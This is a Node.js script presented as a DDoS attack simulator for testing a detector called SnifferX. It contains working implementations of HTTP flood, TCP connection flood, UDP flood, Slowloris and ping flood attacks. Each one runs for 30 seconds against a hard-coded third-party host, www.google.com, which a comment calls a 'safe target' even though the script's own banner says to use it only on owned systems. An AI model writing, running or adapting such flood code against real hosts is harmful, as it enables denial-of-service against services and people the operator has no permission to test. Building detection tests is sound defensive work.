#!/usr/bin/env node

/**
 * DDoS Attack Simulator for Windows
 * This script simulates various types of DDoS attacks to test SnifferX detection
 * 
 * Usage: node simulate-ddos-windows.js [attack-type]
 * Attack types: flood, slowloris, udp, http
 */

const http = require('http');
const https = require('https');
const dgram = require('dgram');
const net = require('net');
const chalk = require('chalk');
const { exec } = require('child_process');

// Configuration
const TARGET_HOST = 'www.google.com';  // Safe target that won't be affected
const TARGET_PORT = 80;
const ATTACK_DURATION = 30000;  // 30 seconds
const REQUEST_INTERVAL = 10;     // milliseconds between requests

class DDoSSimulator {
    constructor() {
        this.attackCount = 0;
        this.isRunning = false;
        this.sockets = [];
    }

    displayBanner() {
        console.log(chalk.red.bold('\n╔════════════════════════════════════════════════════════╗'));
        console.log(chalk.red.bold('║         DDoS ATTACK SIMULATOR (TESTING ONLY)         ║'));
        console.log(chalk.red.bold('╚════════════════════════════════════════════════════════╝'));
        console.log(chalk.yellow('⚠️  WARNING: For educational and testing purposes only!'));
        console.log(chalk.yellow('⚠️  Only use on your own systems or with permission!\n'));
        console.log(chalk.cyan(`🎯 Target: ${TARGET_HOST}`));
        console.log(chalk.cyan(`⏱️  Duration: ${ATTACK_DURATION / 1000} seconds`));
        console.log(chalk.cyan(`📊 Request Rate: Every ${REQUEST_INTERVAL}ms\n`));
    }

    /**
     * HTTP Flood Attack - Rapid HTTP requests
     */
    async httpFlood() {
        console.log(chalk.green.bold('\n🌊 Starting HTTP Flood Attack...\n'));
        
        const startTime = Date.now();
        const interval = setInterval(() => {
            if (Date.now() - startTime > ATTACK_DURATION) {
                clearInterval(interval);
                this.showResults();
                return;
            }

            // Send HTTP request
            const req = http.get(`http://${TARGET_HOST}/`, (res) => {
                this.attackCount++;
                if (this.attackCount % 100 === 0) {
                    console.log(chalk.gray(`  [+] Sent ${this.attackCount} requests...`));
                }
            });

            req.on('error', () => {
                // Ignore errors, we're just flooding
            });

            req.setTimeout(1000);
        }, REQUEST_INTERVAL);

        this.isRunning = true;
    }

    /**
     * SYN Flood Attack - TCP connection flood
     */
    async synFlood() {
        console.log(chalk.green.bold('\n🌊 Starting SYN Flood Attack...\n'));
        
        const startTime = Date.now();
        const interval = setInterval(() => {
            if (Date.now() - startTime > ATTACK_DURATION) {
                clearInterval(interval);
                this.cleanup();
                this.showResults();
                return;
            }

            // Create TCP connection
            const socket = new net.Socket();
            socket.setTimeout(1000);
            
            socket.connect(TARGET_PORT, TARGET_HOST, () => {
                this.attackCount++;
                if (this.attackCount % 50 === 0) {
                    console.log(chalk.gray(`  [+] Opened ${this.attackCount} connections...`));
                }
                socket.destroy();
            });

            socket.on('error', () => {
                // Ignore errors
            });

            this.sockets.push(socket);
        }, REQUEST_INTERVAL);

        this.isRunning = true;
    }

    /**
     * UDP Flood Attack
     */
    async udpFlood() {
        console.log(chalk.green.bold('\n🌊 Starting UDP Flood Attack...\n'));
        
        const socket = dgram.createSocket('udp4');
        const message = Buffer.alloc(1024, 'A'); // 1KB packet
        
        const startTime = Date.now();
        const interval = setInterval(() => {
            if (Date.now() - startTime > ATTACK_DURATION) {
                clearInterval(interval);
                socket.close();
                this.showResults();
                return;
            }

            socket.send(message, TARGET_PORT, TARGET_HOST, (err) => {
                if (!err) {
                    this.attackCount++;
                    if (this.attackCount % 100 === 0) {
                        console.log(chalk.gray(`  [+] Sent ${this.attackCount} UDP packets...`));
                    }
                }
            });
        }, REQUEST_INTERVAL);

        this.isRunning = true;
    }

    /**
     * Slowloris Attack - Slow HTTP requests
     */
    async slowloris() {
        console.log(chalk.green.bold('\n🐌 Starting Slowloris Attack...\n'));
        
        const connections = 100; // Number of slow connections
        
        for (let i = 0; i < connections; i++) {
            const socket = new net.Socket();
            
            socket.connect(TARGET_PORT, TARGET_HOST, () => {
                this.attackCount++;
                console.log(chalk.gray(`  [+] Connection ${this.attackCount} established...`));
                
                // Send partial HTTP request
                socket.write('GET / HTTP/1.1\r\n');
                socket.write(`Host: ${TARGET_HOST}\r\n`);
                socket.write('User-Agent: Mozilla/5.0\r\n');
                
                // Keep connection alive by sending headers slowly
                const keepAlive = setInterval(() => {
                    try {
                        socket.write(`X-Header-${Date.now()}: value\r\n`);
                    } catch (e) {
                        clearInterval(keepAlive);
                    }
                }, 5000);

                setTimeout(() => {
                    clearInterval(keepAlive);
                    socket.destroy();
                }, ATTACK_DURATION);
            });

            socket.on('error', () => {
                // Ignore errors
            });

            this.sockets.push(socket);
        }

        this.isRunning = true;
        setTimeout(() => {
            this.cleanup();
            this.showResults();
        }, ATTACK_DURATION);
    }

    /**
     * Ping Flood (requires admin/elevated privileges)
     */
    async pingFlood() {
        console.log(chalk.green.bold('\n🏓 Starting Ping Flood...\n'));
        console.log(chalk.yellow('Note: This requires administrator privileges\n'));
        
        const startTime = Date.now();
        const interval = setInterval(() => {
            if (Date.now() - startTime > ATTACK_DURATION) {
                clearInterval(interval);
                this.showResults();
                return;
            }

            // Send ping
            exec(`ping -n 1 -w 100 ${TARGET_HOST}`, (error, stdout, stderr) => {
                if (!error) {
                    this.attackCount++;
                    if (this.attackCount % 20 === 0) {
                        console.log(chalk.gray(`  [+] Sent ${this.attackCount} pings...`));
                    }
                }
            });
        }, REQUEST_INTERVAL);

        this.isRunning = true;
    }

    /**
     * Cleanup resources
     */
    cleanup() {
        this.sockets.forEach(socket => {
            try {
                socket.destroy();
            } catch (e) {
                // Ignore
            }
        });
        this.sockets = [];
    }

    /**
     * Show attack results
     */
    showResults() {
        console.log(chalk.green.bold('\n\n✓ Attack Simulation Complete!'));
        console.log(chalk.cyan('═══════════════════════════════════════════════════════'));
        console.log(chalk.white(`  Total Requests: ${chalk.yellow.bold(this.attackCount)}`));
        console.log(chalk.white(`  Duration: ${chalk.yellow.bold(ATTACK_DURATION / 1000)} seconds`));
        console.log(chalk.white(`  Average Rate: ${chalk.yellow.bold(Math.round(this.attackCount / (ATTACK_DURATION / 1000)))} requests/sec`));
        console.log(chalk.cyan('═══════════════════════════════════════════════════════\n'));
        console.log(chalk.green('💡 Now check your SnifferX dashboard for alerts!\n'));
        this.isRunning = false;
    }

    /**
     * Run simulation
     */
    async run(attackType) {
        this.displayBanner();

        switch (attackType) {
            case 'http':
            case 'flood':
                await this.httpFlood();
                break;
            case 'syn':
                await this.synFlood();
                break;
            case 'udp':
                await this.udpFlood();
                break;
            case 'slowloris':
                await this.slowloris();
                break;
            case 'ping':
                await this.pingFlood();
                break;
            default:
                console.log(chalk.red('❌ Unknown attack type!'));
                console.log(chalk.yellow('\nAvailable attack types:'));
                console.log(chalk.white('  • http     - HTTP flood attack'));
                console.log(chalk.white('  • syn      - SYN flood attack'));
                console.log(chalk.white('  • udp      - UDP flood attack'));
                console.log(chalk.white('  • slowloris - Slowloris attack'));
                console.log(chalk.white('  • ping     - Ping flood attack\n'));
                process.exit(1);
        }
    }
}

// Handle Ctrl+C
process.on('SIGINT', () => {
    console.log(chalk.yellow('\n\n⚠️  Stopping attack simulation...'));
    process.exit(0);
});

// Main execution
const attackType = process.argv[2] || 'http';
const simulator = new DDoSSimulator();
simulator.run(attackType);
